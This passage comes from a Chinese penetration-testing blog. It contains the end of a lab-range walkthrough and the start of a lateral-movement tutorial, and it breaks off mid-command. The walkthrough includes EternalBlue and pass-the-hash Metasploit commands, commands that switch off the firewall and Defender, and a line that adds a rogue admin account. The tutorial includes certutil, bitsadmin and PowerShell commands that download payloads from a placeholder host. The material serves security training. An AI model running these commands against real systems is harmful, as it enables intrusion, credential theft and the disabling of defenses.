style="zoom:50%;"><p>也可以使用 MSF 自带<code>auxiliary/scanner/portscan/tcp</code>模块扫描内网域成员主机开放的端口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span></span><br><span class="line"><span class="built_in">set</span> ports <span class="number">80</span>,<span class="number">135</span><span class="number">-139</span>,<span class="number">445</span>,<span class="number">3306</span>,<span class="number">3389</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815172304874.png" alt="image-20230815172304874" style="zoom:50%;"><p>同样看到了开放的端口</p><p>开放了445端口，所以利用<code>use auxiliary/scanner/smb/smb_version</code>可以扫描系统版本，扫描结果是win2003</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set set RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815172641128.png" alt="image-20230815172641128" style="zoom:50%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815174319955.png" alt="image-20230815174319955" style="zoom: 50%;"><p>扫出版本为<strong>Windows2003</strong>和<strong>Windows2008</strong></p><h5 id="6-4永恒之蓝攻击"><a href="#6-4永恒之蓝攻击" class="headerlink" title="6.4永恒之蓝攻击"></a>6.4永恒之蓝攻击</h5><p><strong>使用msf辅助模块进行扫描，查看是否存在ms17-010漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/</span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line">set threads 500</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815175514016.png" alt="image-20230815175514016" style="zoom:50%;"><p>三台机器都存在ms17-010</p><p>也可以用下面这种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010 #搜索MSF集成的与ms17_010漏洞相关的模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010 # 加载扫描exp</span><br><span class="line">set rhosts 192.168.52.141 #设置被扫描的主机IP</span><br><span class="line">run  #进行扫描，观察是否存在该漏洞</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816164945947.png" alt="image-20230816164945947" style="zoom:50%;"><p>发下内网的两台主机都存在永恒之蓝，接下来用poc攻击，尝试拿一个shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816165237455.png" alt="image-20230816165237455" style="zoom:50%;"><p>但是没有shell会话弹回来</p><p>看网上说是跳板机 Win7 的防火墙导致的，所以返回 Win7 的 Shell 会话并执行命令关闭跳板机的防火墙功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessions -l #查看所有会话</span><br><span class="line">sessions 4  #进入会话4中</span><br><span class="line">shell</span><br><span class="line">netsh advfirewall set allprofiles state off #关闭防火墙</span><br><span class="line">net stop windefend #关闭Windows defender</span><br></pre></td></tr></table></figure><p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/typora笔记/图片/image-20230816165811463.png" alt="image-20230816165811463" style="zoom: 50%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816165847539.png" alt="image-20230816165847539" style="zoom: 50%;"></p><p>可以看到win7那边收到关闭防火墙的提示</p><p>继续用永恒之蓝打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816170709465.png" alt="image-20230816170709465" style="zoom:50%;"><p>还是弹不会shell会话:sob:</p><p>但是看到可以使用远程桌面</p><p>server2003这台主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">set command net user Yokan !@#123qwe!@# /add #添加用户</span><br><span class="line">run #成功执行</span><br><span class="line">set command net localgroup administrators Yokan /add #管理员权限</span><br><span class="line">run #成功执行</span><br><span class="line">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span><br><span class="line">run #成功执行</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815183217979.png" alt="image-20230815183217979" style="zoom:50%;"><p>这里特别注意，因为开启3389端口命令中有两个双引号，如果整条命令外面不用单引号扩一下，会出现一些符号闭合上的问题</p><p> 然后使用proxychains连接 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.52.141</span><br></pre></td></tr></table></figure><p>使用刚刚设置的账号密码登陆成功</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815184007250.png" alt="image-20230815184007250" style="zoom:50%;"><h4 id="7-MSF哈希传递攻击PTH"><a href="#7-MSF哈希传递攻击PTH" class="headerlink" title="7.MSF哈希传递攻击PTH"></a>7.MSF哈希传递攻击PTH</h4><p>上面既然通过永恒之蓝漏洞难以获得域控主机的 Shell，那就换一种攻击思路拿下域控吧，下面尝试通过哈希传递攻击 PTH 拿下域控主机。PTH 的相关概念和知识参见：<a href="https://bwshen.blog.csdn.net/article/details/118338328">浅析Windows域环境身份认证与攻击思路</a>。</p><p><strong>[哈希传递攻击]<strong>在 <code>kerberos</code>、<code>NTLM </code>认证过程的关键，首先就是基于用户密码 <strong>Hash</strong> 的加密，所以在域渗透中，无法破解用户密码 <strong>Hash</strong> 的情况下，也可以直接利用 <strong>Hash</strong> 来完成认证，达到攻击的目的，这就是 hash 传递攻击（</strong>Pass The Hash</strong>，简称 <strong>PTH</strong>）。如果内网主机的本地管理员账户密码相同，那么可以通过 <strong>PTH</strong> 远程登录到任意一台主机，操作简单、威力无穷。</p><p>在域环境中，利用哈希传递攻击的渗透方式往往是这样的：</p><ol><li>获得一台域主机的权限，<strong>Dump</strong> 内存获得该主机的用户密码 <strong>Hash</strong> 值；</li><li>通过哈希传递攻击尝试登录其他主机；</li><li>继续搜集 <strong>Hash</strong> 并尝试远程登录，直到获得域管理员账户 <strong>Hash</strong>，登录域控，最终成功控制整个域。</li></ol><p>之前已经获取了Administrator 管理员账户的密码信息</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812122605873.png" alt="image-20230812122605873" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM: 6eda2e2c452f2be8da7e73a8c1b5bd0d</span><br></pre></td></tr></table></figure><p>以<code>exploit/windows/smb/psexec</code>模块哈希传递攻击 Windows Server 2008 为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 00000000000000000000000000000000:6eda2e2c452f2be8da7e73a8c1b5bd0d</span><br><span class="line">set smbdomain god</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816174628380.png" alt="image-20230816174628380" style="zoom:50%;"><p>还是没成功:sob:</p><h4 id="8-CS上线"><a href="#8-CS上线" class="headerlink" title="8.CS上线"></a>8.CS上线</h4><p>之前没有成功，换一种打法，用CS</p><p>一开始安装的4.0版本，但是添加<strong>lisenner</strong>的时候有bug，于是换了一个4.7版本， 链接[CobaltStrike4.7](<a href="https://download.csdn.net/download/weixin_53912233/86890411?ops_request_misc=%7B%22request_id%22:%22169220222216800211551748%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=169220222216800211551748&biz_id=1&utm_medium=distribute.pc_search_result.none-task-download-2~all~first_rank_ecpm_v1~rank_v31_ecpm-7-86890411-null-null.142%5Ev92%5EcontrolT0_1&utm_term=kali">https://download.csdn.net/download/weixin_53912233/86890411?ops_request_misc=%7B%22request%5Fid%22%3A%22169220222216800211551748%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=169220222216800211551748&amp;biz_id=1&amp;utm_medium=distribute.pc_search_result.none-task-download-2~all~first_rank_ecpm_v1~rank_v31_ecpm-7-86890411-null-null.142^v92^controlT0_1&amp;utm_term=kali</a> cobalt strike下载&amp;spm&#x3D;1018.2226.3001.4187.8)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.85.128 1234567</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816221506922.png" alt="image-20230816221506922" style="zoom: 67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/3074366-20230315202803226-19896095.png" alt="img" style="zoom: 80%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816221902658.png" alt="image-20230816221902658" style="zoom: 50%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816221933965.png" alt="image-20230816221933965" style="zoom: 67%;"><p>生成一个<strong>artifact.exe</strong>文件，用蚁剑上传并执行，kali端成功上线</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816222406111.png" alt="image-20230816222406111" style="zoom: 67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816222442436.png" alt="image-20230816222442436" style="zoom: 67%;"><p>点击<strong>process–&gt;Explore–&gt;Net View</strong>，探测内网存活主机</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816223630022.png" class title="image-20230816223630022"><p>点击<strong>Access–&gt;Run Mimikatz</strong>抓取本机用户密码</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816224241233.png" alt="image-20230816224241233" style="zoom:50%;"><p>点击瞄准镜图标可以看到三台主机</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816224712049.png" class title="image-20230816224712049"><p>选择138，点击<strong>jump–&gt;psexec</strong>,新建一个<strong>lisenner</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230817004307897.png" alt="image-20230817004307897" style="zoom:60%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230816231130701.png" alt="image-20230816231130701" style="zoom:67%;"><p>收到shell</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230817004335830.png" class title="image-20230817004335830"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell systeminfo</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230817004645964.png" class title="image-20230817004645964"><p>拿下域控:happy:</p><p>点击<strong>Explore–&gt;File Browser</strong> 进入文件管理， 可以进行上传文件操作</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230817003910028.png" class title="image-20230817003910028">]]></content>
      
      
      <categories>
          
          <category> 渗透打靶 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动</title>
      <link href="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><p>横向移动（<strong>Lateral Movement</strong>）是从一个受感染主机迁移到另一个受感染主机的过程。一旦进入内部网络，测试人员就会将已被攻陷的机器作为跳板，继续访问或控制内网中的其他机器，直至获取机密数据或控制关键资产。通过横行移动，测试人员最终可能获取域控制器的权限并接管整个域环境。</p><p>横向移动包括用来进入内部网络和控制网络上的远程系统的技术。通常，测试人员需要借助内网代理来探测内网中存活的资产，并确定最终的攻击目标。然后通过收集到的用户凭据，利用各种远程控制技术对目标发起攻击。<br>本章所有关于横向移动的攻击技术都以图5-0-1所示的网络拓扑进行测试。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231031205646974.png" class title="image-20231031205646974"><p><strong>Kali Linux</strong>为测试人员的主机，其对测试人员是可控的，也被称为“可控主机”或“可控服务器”。<br><strong>Initial Victim</strong>为测试人员最初攻陷的机器，也被称为“跳板机“所控主机”或“当前所控主机”。<br>内网中的其他三台机器分别是本次实践的横向移动目标，需要从<strong>Initial Victim</strong>迁移到这三台目标机器。它们也被称为“远程主机”或“内网其他主机”。</p><h2 id="横向移动中的文件传输"><a href="#横向移动中的文件传输" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h2><p>攻击时往往需要预先制订文件传输方案，以便在后续操作过程中向攻击目标部署攻击载荷或其他文件。</p><h3 id="通过网络共享-IPC"><a href="#通过网络共享-IPC" class="headerlink" title="通过网络共享($IPC)"></a>通过网络共享($IPC)</h3><p><strong>Windows</strong>系统中的网络共享功能可以实现局域网之间的文件共享。通过提供有效的用户凭据，用户可以很轻松地将文件从一台机器传输到另一台机器。<br>执行<code>net share</code>命令，获得<strong>Windows</strong>系统默认开启的网络共享，其中<code>C$</code>为C盘共享，<code>ADMINS$</code>为系统目录共享，还有一个是<code>IPC$</code>共享。<strong>IPC（Internet Process Connection）</strong><br>是共享“命名管道”的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。<br>利用当前所控主机与内网中的其他远程主机建立的网络共享连接，测试人员可以访问远程主机上的资源，如直接查看远程主机目录、在两台主机之间复制文件、读取远程主机上的文件等。而实战中往往会建立<code>IPC$</code>连接。因为通过<code>PC$</code>连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或系统服务等，这在进行内网横向移动中起着至关重要的作用。<br>建立<code>IPC$</code>连接需要具备以下两个条件：</p><ol><li>远程主机开启了<strong>IPC</strong>连接</li><li>远程主机的<strong>139</strong>端口和<strong>445</strong>端口开放。</li></ol><p>执行以下命令，与远程主机建立<strong>IPC</strong>连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.111.137\IPC$ &quot;Admin@123&quot; /user:&quot;administrator&quot;</span><br><span class="line"># net use \\&lt;IP/Hostname&gt;\IPC$ &lt;Password&gt; /user:&lt;Username&gt;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231031211608821.png" alt="image-20231031211608821" style="zoom: 50%;"><p>此时，执行以下命令，可以成功列出远程主机的C盘共享目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.111.163\C$</span><br></pre></td></tr></table></figure><p>使用<strong>copy</strong>命令，可以通过共享连接向远程主机上复制文件，也可以将远程主机上的文件复制到本地，但需要注意当前用户对远程目录的权限。例如，将一个二进制程序复制到远程主机的C盘目录中。实战中可以将攻击载荷上传到远程主机，然后通过其他远程执行的方法来运行，如创建远程计划任务或服务等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\reverse_tcp.exe \\192.168.111.137\C$</span><br></pre></td></tr></table></figure><p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231031212422033.png" alt="image-20231031212422033" style="zoom:50%;">建立其他共享连接的命令与**IPC$<strong>连接的命令相同，需要指定远程主机的IP或主机名、盘符、用户名和密码。例如，连接远程主机的</strong>C$**共享：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.111.137\C$ &quot;Admin@123&quot; /user:&quot;Administrator&quot;</span><br></pre></td></tr></table></figure><h3 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h3><p><strong>SMB</strong>（<strong>Server Message Block</strong>，服务器消息块），又称<strong>CIFS</strong>（<strong>Common Internet File System</strong>，网络文件共享系统），由微软开发，基于应用层网络传输协议，主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通新等资源。<strong>SMB</strong>消息一般使用<strong>NetBIOS</strong>协议或<strong>TCP</strong>发送，分别使用端口<strong>139</strong>或<strong>445</strong>，目前倾向于使用<strong>445</strong>端口。</p><p>实战中可以在测试人员自己的服务器或当前所控内网主机上搭建<strong>SMB</strong>服务器，将需要横向传输的文件如攻击载荷等放入<strong>SMB</strong>服务器的共享目录，并指定<strong>UNC</strong>路径，让横向移动的目标主机远程加载<strong>SMB</strong>共享的文件。注意，需使用<strong>SMB</strong>匿名共享，并且搭建的<strong>SMB</strong>服务器能够被横向移动的目标所访问到。</p><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>在<strong>Linux</strong>系统上，可以通过<strong>Impacket</strong>项目提供的<strong>smbserver.py</strong>来搭建<strong>SMB</strong>服务器。<br>执行以下命令，即可在搭建一个名为<strong>evilsmb</strong>，共享目录指向<code>/root/share</code>的<strong>SMB</strong>匿名共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/share</span><br><span class="line">python smbserver.py evilsmb /root/share -smb2support</span><br></pre></td></tr></table></figure><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><h5 id="通过界面开启可匿名访问的文件共享服务器"><a href="#通过界面开启可匿名访问的文件共享服务器" class="headerlink" title="通过界面开启可匿名访问的文件共享服务器"></a>通过界面开启可匿名访问的文件共享服务器</h5><p>具体方法如下：</p><ol><li><p>启用Guest用户</p><p>运行<code>gpedit.msc</code>，打开组策略</p><p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>Security Options</code></p><p>选择策略<code>Accounts: Guest account status</code>，设置为<code>Enabled</code></p></li><li><p>将Everyone权限应用于匿名用户</p><p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>Security Options</code></p><p>选择策略<code>Network access:Let Everyone permissions apply to anonymous users</code>，设置为<code>Enabled</code></p></li><li><p>指定匿名共享文件的位置</p><p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>Security Options</code></p><p>选择策略<code>Network access:Shares that can be accessed anonymously</code>，设置名称，这里可以填入<code>smb</code></p></li><li><p>将Guest用户从策略“拒绝从网络访问这台计算机”中移除</p><p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>User Rights Assignment</code></p><p>选择策略<code>Deny access to this computer from the network</code>，移除用户Guest</p></li><li><p>设置文件共享</p><p>选择要共享的文件夹，设置高级共享，共享名为<code>smb</code>，共享权限组或用户名为<code>Everyone</code></p><p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为<code>//&lt;ip&gt;/smb</code></p></li></ol><h5 id="使用命令行开启共享"><a href="#使用命令行开启共享" class="headerlink" title="使用命令行开启共享"></a><strong>使用命令行开启共享</strong></h5><ol><li><p>启用<strong>Guest</strong>用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user guest /active:yes</span><br></pre></td></tr></table></figure></li><li><p>将<strong>Everyone</strong>权限应用于匿名用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></li><li><p>指定匿名共享文件的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d smb /f</span><br></pre></td></tr></table></figure></li><li><p>将<strong>Guest</strong>用户从策略“拒绝从网络访问这台计算机”中移除</p><p>导出组策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /export /cfg gp.inf /quiet</span><br></pre></td></tr></table></figure><p>修改文件<code>gp.inf</code>，将<code>SeDenyNetworkLogonRight = Guest</code>修改为<code>SeDenyNetworkLogonRight =</code>，保存</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231106205656508.png" alt="image-20231106205656508" style="zoom:50%;"><p>重新导入组策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /configure /db gp.sdb /cfg gp.inf /quiet</span><br></pre></td></tr></table></figure><p>强制刷新组策略，立即生效(否则，重启后生效)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate/force</span><br></pre></td></tr></table></figure></li><li><p>设置文件共享</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\share\ /T /grant Everyone:r</span><br><span class="line">net share share=c:\share /grant:everyone,full</span><br></pre></td></tr></table></figure></li></ol><p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为<code>//&lt;ip&gt;/smb</code></p><h5 id="脚本一键开启"><a href="#脚本一键开启" class="headerlink" title="脚本一键开启"></a><strong>脚本一键开启</strong></h5><p><a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Enable  #开启</span><br><span class="line">Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Disable  #关闭</span><br></pre></td></tr></table></figure><h3 id="通过Windows自带工具"><a href="#通过Windows自带工具" class="headerlink" title="通过Windows自带工具"></a>通过Windows自带工具</h3><h5 id="1-Certutil"><a href="#1-Certutil" class="headerlink" title="1.Certutil"></a>1.Certutil</h5><p><strong>certutil</strong>是<strong>Windows</strong>自带的命令行工具，用于管理<strong>Windows</strong>证书并作为证书服务的一部分安装。<strong>Certutil</strong>提供了从网络中下载文件的功能，测试人员可以在远程主机上执行<strong>Certutil</strong>命令，控制其下载预先部署在可控服务器上的恶意文件，如攻击载荷等。<br>执行以下命今：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://IP:Port/shell.exe C:\reverse_tcp.exe</span><br></pre></td></tr></table></figure><p> 通过<strong>Certutil</strong>下载<strong>shell.exe</strong>，并将其保存到<strong>C:\reverse_tcp.exe</strong></p><h5 id="2-BITSAdmin"><a href="#2-BITSAdmin" class="headerlink" title="2.BITSAdmin"></a>2.BITSAdmin</h5><p><strong>Bitsadmin</strong>是一个<strong>Windows</strong>命令行工具，可以用于创建、下载或上载作业，监视其进度。<strong>Windows7</strong>及以后版本的系统自带<strong>Bitsadmin</strong>工具。执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer test http://IP:Port/shell.exe C:\reverse_tcp.exe</span><br></pre></td></tr></table></figure><p>创建一个名为<strong>text</strong>的<strong>Bitsadmin</strong>任务，下载<strong>shell.exe</strong>到本地，并将其保存到<code>C:\reverse_tcp.exe</code></p><h5 id="3-Powershell"><a href="#3-Powershell" class="headerlink" title="3.Powershell"></a>3.Powershell</h5><p>参考<strong>PowerShell</strong>远程加载执行的思路，可以通过创建<strong>WebClient</strong>对象来实现文件下载。执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(New-Object Net.WebClient).DownloadFile(&#x27;http://IP:Port/shell.exe&#x27;,&#x27;C:\reverse_tcp.exe&#x27;)</span><br></pre></td></tr></table></figure><p>下载<strong>shell.exe</strong>到本地并保存到<code>C:\reverse_tcp.exe</code></p><h2 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h2><h3 id="常规利用流程"><a href="#常规利用流程" class="headerlink" title="常规利用流程"></a>常规利用流程</h3><p>通过已有的PC连接，在远程主机上创建计划任务，让目标主机在规定的时间点或周期内执行特定操作。在拥有对方管理员凭据的条件下，可以通过计划任务实现横向移动，具体操作流程如下。</p><ol><li>利用已建立的共享连接向远程主机（<strong>10.10.10.19</strong>）上传攻击载荷。</li><li>利用已建立的<strong>IPC</strong>连接或指定用户凭据的方式在远程主机上创建计划任务。执行以下命令：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 